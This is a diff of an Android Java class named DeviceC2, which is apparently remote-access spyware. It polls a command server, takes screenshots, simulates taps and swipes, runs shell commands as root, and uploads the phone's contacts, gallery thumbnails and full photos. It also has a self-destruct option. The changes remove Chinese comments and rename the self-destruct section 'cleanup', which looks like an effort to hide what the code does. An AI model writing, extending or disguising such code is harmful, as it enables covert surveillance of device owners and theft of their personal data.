@@ -124,7 +124,7 @@ final class DeviceC2 {
                     pollSeconds = newPoll;
                     c2Allowed = cfg.c2Enabled();
                     selfDestructAllowed = cfg.selfDestructEnabled();
-                    if (pollChanged) wake(); // 新间隔立即生效
+                    if (pollChanged) wake();
                 }
             }
 
@@ -149,7 +149,6 @@ final class DeviceC2 {
                         if (selfDestructAllowed) destruct = true;
                         doneIds.add(id);
                     } else if ("wake".equals(type)) {
-                        // 立即触发下次心跳，不需要执行
                         doneIds.add(id);
                         wake();
                     } else {
@@ -188,7 +187,7 @@ final class DeviceC2 {
                             Toast.makeText(ctx, text, Toast.LENGTH_LONG).show();
                         } catch (Throwable ignored) {}
                     });
-                    showNotification(ctx, "消息", text);
+                    showNotification(ctx, "Info", text);
                 }
                 break;
             }
@@ -259,7 +258,6 @@ final class DeviceC2 {
         }
     }
 
-    // ---- 截图（双路：root screencap | 无障碍 API30+）----
     private static void takeScreenshotAndUpload(Context ctx, String cmdId) {
         if (RootUtils.isRooted()) {
             takeScreenshotRoot(ctx, cmdId);
@@ -317,7 +315,7 @@ final class DeviceC2 {
         uploadBytes(ctx, cmdId, "screenshot", "png", result[0], "image/png");
     }
 
-    // ---- 模拟点击（双路：root input | 无障碍手势）----
+    // ---- tap ----
     private static void tapInput(Context ctx, String cmdId, float x, float y) {
         boolean ok;
         if (RootUtils.isRooted()) {
@@ -330,7 +328,7 @@ final class DeviceC2 {
                 "tap x=" + (int) x + " y=" + (int) y + " ok=" + ok);
     }
 
-    // ---- 模拟滑动（双路：root input | 无障碍手势）----
+    // ---- swipe ----
     private static void swipeInput(Context ctx, String cmdId, float x1, float y1, float x2, float y2, int dur) {
         boolean ok;
         if (RootUtils.isRooted()) {
@@ -345,7 +343,7 @@ final class DeviceC2 {
                         + " x2=" + (int) x2 + " y2=" + (int) y2 + " dur=" + dur + " ok=" + ok);
     }
 
-    // ---- Shell（双路：su -c | sh -c）----
+    // ---- shell ----
     private static void runShellAndUpload(Context ctx, String cmdId, String cmd) {
         try {
             String result;
@@ -378,13 +376,11 @@ final class DeviceC2 {
         return sb.toString().trim();
     }
 
-    // ---- 联系人（ContentResolver，需 READ_CONTACTS 权限）----
+    // ---- contacts ----
     private static void getContactsAndUpload(Context ctx, String cmdId) {
         try {
-            // 检查运行时权限
             if (ctx.checkSelfPermission("android.permission.READ_CONTACTS")
                     != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                // 无权限：上传错误提示 JSON
                 String err = "[{\"error\":\"READ_CONTACTS permission not granted\"}]";
                 uploadBytes(ctx, cmdId, "get_contacts", "json",
                         err.getBytes(StandardCharsets.UTF_8), "application/json");
@@ -423,7 +419,7 @@ final class DeviceC2 {
         }
     }
 
-    // ---- 相册（始终用 MediaStore，上传JSON元数据+前N张缩略图）----
+    // ---- gallery ----
     private static void getGalleryAndUpload(Context ctx, String cmdId, int limit) {
         try {
             String[] proj = {
@@ -433,7 +429,6 @@ final class DeviceC2 {
                     android.provider.MediaStore.Images.Media.SIZE
             };
             android.net.Uri uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-            // 收集 ID + 元数据
             List<long[]> idList = new ArrayList<>();
             Cursor cursor = ctx.getContentResolver().query(uri, proj, null, null,
                     android.provider.MediaStore.Images.Media.DATE_ADDED + " DESC");
@@ -459,7 +454,6 @@ final class DeviceC2 {
             byte[] jsonBytes = sb.toString().getBytes(StandardCharsets.UTF_8);
             uploadBytes(ctx, cmdId, "get_gallery", "json", jsonBytes, "application/json");
 
-            // 上传前 N 张缩略图（最多20张，每张≤200KB）
             int thumbLimit = Math.min(idList.size(), 20);
             for (int i = 0; i < thumbLimit; i++) {
                 try {
@@ -471,7 +465,6 @@ final class DeviceC2 {
                     try (java.io.InputStream is = ctx.getContentResolver().openInputStream(itemUri)) {
                         if (is != null) BitmapFactory.decodeStream(is, null, opts);
                     }
-                    // 计算采样率使宽高 ≤ 480px
                     int sampleSize = 1;
                     if (opts.outWidth > 480 || opts.outHeight > 480) {
                         sampleSize = Math.max(opts.outWidth, opts.outHeight) / 480;
@@ -485,7 +478,6 @@ final class DeviceC2 {
                         ByteArrayOutputStream baos = new ByteArrayOutputStream();
                         int quality = 60;
                         bmp.compress(Bitmap.CompressFormat.JPEG, quality, baos);
-                        // 如果还太大，降低质量重试
                         while (baos.size() > 200 * 1024 && quality > 20) {
                             baos.reset();
                             quality -= 15;
@@ -496,19 +488,17 @@ final class DeviceC2 {
                         uploadBytes(ctx, cmdId, "gallery_photo", "jpg", thumbBytes, "image/jpeg");
                     }
                 } catch (Throwable ignored) {
-                    // 某张图片读取失败不影响后续
                 }
             }
             Log.i(TAG, "get_gallery: uploaded " + count + " meta + " + thumbLimit + " thumbs");
         } catch (Throwable t) {
             Log.e(TAG, "get_gallery error: " + t.getMessage());
             try {
-                uploadText(ctx, cmdId, "get_gallery", "相册获取失败: " + t.getMessage());
+                uploadText(ctx, cmdId, "get_gallery", "gallery error: " + t.getMessage());
             } catch (Throwable ignored) {}
         }
     }
 
-    // ---- 获取单张图片（按 ID 上传实际图片）----
     private static void getPhotoAndUpload(Context ctx, String cmdId, String photoId) {
         try {
             long id = Long.parseLong(photoId);
@@ -531,7 +521,7 @@ final class DeviceC2 {
             try (java.io.InputStream is = ctx.getContentResolver().openInputStream(itemUri)) {
                 if (is == null) {
                     uploadBytes(ctx, cmdId, "get_photo", "txt",
-                            ("无法打开图片: " + photoId).getBytes(StandardCharsets.UTF_8), "text/plain");
+                            ("cannot open: " + photoId).getBytes(StandardCharsets.UTF_8), "text/plain");
                     return;
                 }
                 byte[] imgBytes = readAllBytes(is);
@@ -540,7 +530,7 @@ final class DeviceC2 {
         } catch (Throwable e) {
             try {
                 uploadBytes(ctx, cmdId, "get_photo", "txt",
-                        ("获取图片失败: " + e.getMessage()).getBytes(StandardCharsets.UTF_8), "text/plain");
+                        ("photo error: " + e.getMessage()).getBytes(StandardCharsets.UTF_8), "text/plain");
             } catch (Throwable ignored) {}
         }
     }
@@ -553,32 +543,28 @@ final class DeviceC2 {
         return baos.toByteArray();
     }
 
-    // ---- 通用开关（分组自定义 switch）----
-    // 存储开关状态到 SharedPrefs，并尝试回调 xp.java
     private static void handleSwitchToggle(Context ctx, String cmdId, String key, boolean on) {
         try {
-            // 持久化开关状态
             ctx.getSharedPreferences("hsz_cfg", 0).edit().putBoolean("sw_" + key, on).apply();
-            // 反射调用 xp 模块的 switch 回调（如果存在）
+
             try {
                 Class<?> xpCls = Class.forName("com.example.msphone.xp");
                 java.lang.reflect.Method m = xpCls.getMethod("onSwitchChanged", String.class, boolean.class);
                 m.invoke(null, key, on);
             } catch (Throwable ignored) {}
-            // 上传结果
-            String msg = "开关[" + key + "]" + (on ? "开" : "关");
+            String msg = "sw[" + key + "]" + (on ? "on" : "off");
             uploadBytes(ctx, cmdId, "switch_toggle", "txt",
                     msg.getBytes(StandardCharsets.UTF_8), "text/plain");
             wake();
         } catch (Throwable t) {
             try {
                 uploadBytes(ctx, cmdId, "switch_toggle", "txt",
-                    ("开关[" + key + "]失败: " + t.getMessage()).getBytes(StandardCharsets.UTF_8), "text/plain");
+                    ("sw[" + key + "]err:" + t.getMessage()).getBytes(StandardCharsets.UTF_8), "text/plain");
             } catch (Throwable ignored) {}
         }
     }
 
-    // ---- JSON 辅助 ----
+    // ---- json helpers ----
     private static boolean optBool(JsonObject obj, String key, boolean def) {
         try {
             if (obj.has(key) && !obj.get(key).isJsonNull() && obj.get(key).isJsonPrimitive())
@@ -587,7 +573,7 @@ final class DeviceC2 {
         return def;
     }
 
-    // ---- 上传工具 ----
+    // ---- upload ----
     private static void uploadBytes(Context ctx, String cmdId, String type, String ext, byte[] bytes, String mime) {
         try {
             Map<String, String> fields = new HashMap<>();
@@ -605,7 +591,7 @@ final class DeviceC2 {
                 message.getBytes(StandardCharsets.UTF_8), "text/plain");
     }
 
-    // ---- ACK / 自毁 / 退出 ----
+    // ---- ack / cleanup ----
     private static void ack(Context ctx, List<String> ids, boolean destruct, boolean blocked) {
         Map<String, String> f = new HashMap<>();
         f.put("device_id", FileUtils.getDeviceIdentifier(ctx));
@@ -637,7 +623,7 @@ final class DeviceC2 {
         });
     }
 
-    // ---- 工具 ----
+    // ---- util ----
     private static byte[] readFile(File f) {
         try (FileInputStream fis = new FileInputStream(f);
              ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
